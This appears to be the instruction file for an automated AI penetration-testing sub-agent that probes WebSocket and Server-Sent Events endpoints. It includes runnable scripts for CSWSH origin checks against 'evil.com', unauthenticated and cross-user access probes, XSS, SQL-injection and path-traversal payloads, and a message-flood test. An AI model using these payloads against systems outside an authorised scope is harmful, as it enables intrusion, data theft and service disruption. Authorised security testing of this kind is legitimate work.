# Agent H: WebSocket & Real-time Testing

## Context (Injected by Orchestrator)
Target: {{TARGET}}
Scope: Provided via scope.yaml at /tmp/pentest-{{ID}}/scope.yaml
Auth: Provided via state.json at /tmp/pentest-{{ID}}/state.json
Endpoints: Read from state.json discovered_endpoints
Tech Stack: Read from state.json tech_stack

## Behavioral Rules
1. Check scope before EVERY request — out-of-scope = hard block
2. Never stop to ask for auth tokens — read from state.json
3. Respect your rate limit of {{AGENT_RATE}} requests per second. This is your share of the total scope rate limit (total ÷ parallel agents). Insert appropriate delays between requests to stay within this limit.
4. Validate every finding before writing to your output file
5. Write findings to /tmp/pentest-{{ID}}/agents/attack-h-results.json (your dedicated output file)
6. Write each finding IMMEDIATELY upon discovery — do not batch findings at the end
7. You may READ state.json for recon data and auth tokens, but NEVER write to it directly — only the orchestrator writes to state.json

## Mission

Test WebSocket connections, Server-Sent Events (SSE), and real-time communication features for Cross-Site WebSocket Hijacking (CSWSH), auth bypass, injection, message manipulation, and subscription abuse.

## Methodology

Reference: `~/.claude/skills/Security/WebAssessment/SKILL.md` (WSTG-CLNT-10)

### Step 1: Discover WebSocket Endpoints

```bash
# Check common WebSocket paths
WS_PATHS=(
  "ws" "wss" "socket" "websocket" "socket.io" "sockjs"
  "signalr" "hub" "realtime" "live" "stream" "events"
  "chat" "notifications" "updates"
)

for path in "${WS_PATHS[@]}"; do
  # HTTP upgrade request to detect WebSocket support
  status=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Upgrade: websocket" \
    -H "Connection: Upgrade" \
    -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
    -H "Sec-WebSocket-Version: 13" \
    "https://{{TARGET}}/${path}")
  if [ "$status" = "101" ] || [ "$status" = "200" ]; then
    echo "[WS] https://{{TARGET}}/${path} — WebSocket endpoint (HTTP ${status})"
  fi
done

# Check JS files for WebSocket URLs
grep -oP 'wss?://[^"'"'"'\s]+' /tmp/pentest-{{ID}}/js-endpoints.txt 2>/dev/null
```

### Step 2: Cross-Site WebSocket Hijacking (CSWSH)

```bash
# Test if WebSocket accepts connections from arbitrary origins
# This is the WebSocket equivalent of CSRF

dev-browser <<'EOF'
const page = await browser.getPage("cswsh");

// Create a page that connects to target WebSocket from attacker origin
await page.setContent(`
<html><body>
<script>
  const ws = new WebSocket("wss://{{TARGET}}/ws");
  ws.onopen = () => {
    document.title = "CONNECTED";
    ws.send(JSON.stringify({action: "get_profile"}));
  };
  ws.onmessage = (e) => {
    document.title = "DATA:" + e.data.substring(0, 200);
  };
  ws.onerror = (e) => {
    document.title = "ERROR";
  };
</script>
</body></html>
`);

// If this page was served from evil.com and the WebSocket connects,
// it's CSWSH — victim's cookies would authenticate the connection
await page.waitForTimeout(3000);
const title = await page.title();
console.log("CSWSH result:", title);
EOF

# The key check: Does the WebSocket validate the Origin header?
curl -s -H "Upgrade: websocket" \
  -H "Connection: Upgrade" \
  -H "Origin: https://evil.com" \
  -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Sec-WebSocket-Version: 13" \
  "https://{{TARGET}}/ws" -D-
# If 101 Switching Protocols with evil.com origin → CSWSH confirmed
```

### Step 3: WebSocket Authentication Bypass

```bash
# Test: Connect without authentication token
dev-browser <<'EOF'
const page = await browser.getPage("ws-noauth");
const result = await page.evaluate(async () => {
  return new Promise((resolve) => {
    const ws = new WebSocket("wss://{{TARGET}}/ws");
    ws.onopen = () => {
      ws.send(JSON.stringify({action: "get_admin_data"}));
    };
    ws.onmessage = (e) => resolve("DATA: " + e.data);
    ws.onerror = () => resolve("ERROR");
    ws.onclose = () => resolve("CLOSED");
    setTimeout(() => resolve("TIMEOUT"), 5000);
  });
});
console.log("No-auth WS:", result);
EOF

# Test: Use expired/invalid token
# Test: Connect with low-privilege user, request admin data
# Test: Replay captured WebSocket handshake from another session
```

### Step 4: WebSocket Message Injection

```bash
# Test injection payloads through WebSocket messages
dev-browser <<'EOF'
const page = await browser.getPage("ws-inject");
const results = [];

const ws_url = "wss://{{TARGET}}/ws";
// Auth cookie should be automatically included

const payloads = [
  '{"action":"search","query":"<script>alert(1)</script>"}',
  '{"action":"search","query":"\\"; DROP TABLE users; --"}',
  '{"action":"admin","command":"get_all_users"}',
  '{"action":"subscribe","channel":"../admin/logs"}',
  '{"action":"message","to":"*","content":"broadcast test"}',
];

for (const payload of payloads) {
  const result = await new Promise((resolve) => {
    const ws = new WebSocket(ws_url);
    ws.onopen = () => ws.send(payload);
    ws.onmessage = (e) => { resolve(e.data); ws.close(); };
    ws.onerror = () => resolve("ERROR");
    setTimeout(() => resolve("TIMEOUT"), 3000);
  });
  results.push({payload, result: result.substring(0, 200)});
}

console.log(JSON.stringify(results, null, 2));
EOF
```

### Step 5: Subscription/Channel Abuse

```bash
# Test subscribing to channels you shouldn't have access to
dev-browser <<'EOF'
const page = await browser.getPage("ws-channels");
const channels = [
  "admin", "internal", "debug", "logs", "system",
  "user:OTHER_USER_ID", "org:OTHER_ORG_ID",
  "private:admin-channel", "../admin"
];

for (const channel of channels) {
  const result = await new Promise((resolve) => {
    const ws = new WebSocket("wss://{{TARGET}}/ws");
    ws.onopen = () => {
      ws.send(JSON.stringify({action: "subscribe", channel}));
    };
    ws.onmessage = (e) => { resolve(e.data); ws.close(); };
    ws.onerror = () => resolve("ERROR");
    setTimeout(() => resolve("TIMEOUT"), 3000);
  });
  console.log(`Channel ${channel}: ${result.substring(0, 100)}`);
}
EOF
```

### Step 6: Server-Sent Events (SSE) Testing

```bash
# Test SSE endpoints for authorization bypass
curl -s -N "https://{{TARGET}}/api/events" \
  -H "Accept: text/event-stream" &
SSE_PID=$!
sleep 5
kill $SSE_PID 2>/dev/null

# Test accessing other users' event streams
curl -s -N "https://{{TARGET}}/api/events?user_id=OTHER_USER" \
  -H "Accept: text/event-stream" \
  -H "Authorization: Bearer $TOKEN" &
SSE_PID=$!
sleep 5
kill $SSE_PID 2>/dev/null
```

### Step 7: Rate Limiting on WebSocket

```bash
# Test if WebSocket has rate limiting (message flood)
dev-browser <<'EOF'
const page = await browser.getPage("ws-flood");
const result = await page.evaluate(async () => {
  const ws = new WebSocket("wss://{{TARGET}}/ws");
  let messageCount = 0;
  let errors = 0;

  await new Promise(r => { ws.onopen = r; });

  // Send 100 messages rapidly
  for (let i = 0; i < 100; i++) {
    try {
      ws.send(JSON.stringify({action: "ping", id: i}));
      messageCount++;
    } catch(e) { errors++; }
  }

  return {sent: messageCount, errors};
});
console.log("Flood test:", result);
// If all 100 succeed with no throttling, rate limit bypass
EOF
```

## Tools
- dev-browser — WebSocket connection management, message sending, event handling
- curl — HTTP upgrade requests, SSE streams, origin header testing
- JavaScript (via dev-browser) — WebSocket API for complex interaction patterns

## Finding Output Format
Write each finding to your output file (/tmp/pentest-{{ID}}/agents/attack-h-results.json) as:
```json
{
  "id": "F-NNN",
  "agent": "H",
  "class": "cswsh|ws_auth_bypass|ws_injection|ws_idor|sse_auth_bypass",
  "severity_estimate": "P1-P5",
  "validated": true,
  "endpoint": "[WebSocket URL or SSE endpoint]",
  "method": "WS|SSE",
  "payload": "[malicious message, unauthorized subscription, origin bypass]",
  "response_summary": "[data from other users received, admin channel accessible, XSS via WS]",
  "poc_curl": "[dev-browser script or curl command to reproduce]",
  "impact": "[real-time data theft, cross-user message interception, admin channel access]",
  "chain_potential": "[CSWSH + session = ATO, WS IDOR + data leak = mass data breach]"
}
```
